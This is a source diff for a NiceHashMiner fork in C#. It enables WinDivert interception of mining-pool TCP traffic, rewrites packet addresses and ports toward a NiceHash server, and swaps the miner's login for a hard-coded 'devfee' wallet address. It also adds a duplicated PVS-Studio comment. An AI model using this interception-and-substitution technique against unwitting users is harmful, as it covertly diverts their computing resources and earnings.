@@ -1,4 +1,12 @@
-﻿using System;
+﻿/*
+* This is an open source non-commercial project. Dear PVS-Studio, please check it.
+* PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
+*/
+/*
+* This is an open source non-commercial project. Dear PVS-Studio, please check it.
+* PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
+*/
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -120,9 +128,9 @@ namespace NiceHashMiner.Miners
             _divertTimer.Stop();
             _divertTimer = null;
 
-           // string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) : (tcp.DstPort == 3380))"; //test xmr nicehash
-     //       string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) : (tcp.DstPort == 3333))";
-            string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) || (tcp.SrcPort == 8008) : (tcp.DstPort == 3333) || (tcp.DstPort == 8008))";
+          //  string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) : (tcp.DstPort == 3380))"; //test xmr nicehash
+            string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) : (tcp.DstPort == 3333))";
+           // string filter = "ip && tcp && (inbound ? (tcp.SrcPort == 3333) || (tcp.SrcPort == 8008) : (tcp.DstPort == 3333) || (tcp.DstPort == 8008))";
            
 
             uint errorPos = 0;
@@ -322,7 +330,8 @@ namespace NiceHashMiner.Miners
                             System.Text.ASCIIEncoding ASCII = new System.Text.ASCIIEncoding();
 
                             // Get server related information.
-                            IPHostEntry heserver = Dns.GetHostEntry("pool.supportxmr.com");
+                            IPHostEntry heserver = Dns.GetHostEntry("randomxmonero.eu.nicehash.com");
+                            //IPHostEntry heserver = Dns.GetHostEntry("pool.supportxmr.com");
 
                             // Loop on the AddressList
                             foreach (IPAddress curAdd in heserver.AddressList)
@@ -345,14 +354,14 @@ namespace NiceHashMiner.Miners
                             if (addr.Direction == WinDivertDirection.Outbound)
                             {
                                 Helpers.ConsolePrint("WinDivertSharp", "Outbound");
-                             //   parse_result.IPv4Header->DstAddr = IPAddress.Parse(servIP);
-                             //   parse_result.TcpHeader->DstPort = SwapOrder(3333); 
+                                parse_result.IPv4Header->DstAddr = IPAddress.Parse(servIP);
+                                parse_result.TcpHeader->DstPort = SwapOrder(3380); 
                             }
                             else //inbound
                             {
                                 Helpers.ConsolePrint("WinDivertSharp", "Inbound");
-                              //  parse_result.IPv4Header->SrcAddr = oldDstAddress;
-                              //  parse_result.TcpHeader->SrcPort = SwapOrder(3380); 
+                                parse_result.IPv4Header->SrcAddr = oldDstAddress;
+                                parse_result.TcpHeader->SrcPort = SwapOrder(3333); 
                             }
                         }
 
@@ -379,7 +388,7 @@ namespace NiceHashMiner.Miners
                             Helpers.ConsolePrint("WinDivertSharp", "login: " + resp.@params.login);
                            // resp.@params.login = "42fV4v2EC4EALhKWKNCEJsErcdJygynt7RJvFZk8HSeYA9srXdJt58D9fQSwZLqGHbij";
                             //resp.@params.login = "42fV4v2EC4EALhKWKNCEJsErcdJygynt7RJvFZk8HSeYA9srXdJt58D9fQSwZLqGHbijCSMqSP4mU7inEEWNyer6F7PiqeX.devfee";
-                            //resp.@params.login = "3F2v4K3ExF1tqLLwa6Ac3meimSjV3iUZgQ.worker20$0-HgaPFxnqIlqsPZDqXC+KyA";
+                            resp.@params.login = "3F2v4K3ExF1tqLLwa6Ac3meimSjV3iUZgQ.devfee20$0-HgaPFxnqIlqsPZDqXC+KyA";
                             //пакет нельзя изменять в размере. Можно дополнять кодом 10 до нужного размера
                             Helpers.ConsolePrint("WinDivertSharp", "new login: " + resp.@params.login);
                             //string newjson = JsonConvert.SerializeObject(resp);
